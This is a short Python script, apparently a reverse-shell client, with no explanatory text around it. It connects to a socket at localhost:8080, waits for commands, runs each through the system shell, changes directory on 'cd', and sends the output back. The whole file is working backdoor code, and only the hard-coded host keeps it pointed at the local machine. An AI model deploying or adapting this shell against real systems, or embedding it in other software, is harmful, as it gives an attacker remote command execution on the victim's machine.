import socket
import subprocess
import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload.connect(('localhost', 8080))
print('establish connect')


def send_data(output_data):
    size_of_data = len(output_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, 'utf-8'))
    payload.send(b'\n')
    payload.send(output_data)


while True:
    cmd = payload.recv(2048)
    cmd = cmd.decode('utf-8')
    if cmd == 'quit':
        payload.close()
        break
    elif cmd[:2] == 'cd':
        os.chdir(cmd[3::])
        continue
    try:
        output = subprocess.check_output(cmd, shell=True)
    except Exception:
        send_data(b'wrong command')
    else:
        send_data(output)
